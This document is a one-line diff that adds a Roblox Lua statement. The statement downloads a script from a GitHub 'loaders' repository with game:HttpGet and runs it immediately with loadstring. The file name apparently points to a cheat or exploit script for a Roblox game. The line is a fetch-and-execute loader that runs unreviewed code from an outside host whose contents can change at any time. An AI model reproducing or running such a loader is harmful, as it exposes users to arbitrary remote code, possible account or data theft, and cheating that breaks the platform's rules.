@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BaseLizardFascinate/loaders/main/loaders/upd-smash-the-city-spam6-qegc0kp9o3gxuy.lua"))()
